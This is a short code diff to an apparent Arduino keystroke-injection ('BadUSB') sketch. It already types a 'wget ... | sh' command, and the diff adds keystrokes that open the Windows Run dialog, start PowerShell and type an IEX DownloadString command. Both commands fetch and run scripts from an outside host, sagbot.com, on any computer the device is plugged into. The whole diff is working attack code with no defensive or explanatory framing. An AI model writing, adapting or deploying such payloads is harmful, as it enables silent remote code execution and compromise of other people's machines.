@@ -20,6 +20,20 @@ void setup(void) {
   delay(500);
 
   Keyboard.print("wget sagbot.com/b -O - | sh --\n");
+
+  // Press Command + R
+  // Press Window + R
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+
+  delay(1000);
+  
+  Keyboard.print("powershell\n");
+  
+  delay(1000);
+
+  Keyboard.print("IEX(New-Object Net.WebClient).DownloadString('https://sagbot.com/a')\n");
   // End Payload
 
   // Stop Keyboard and Mouse
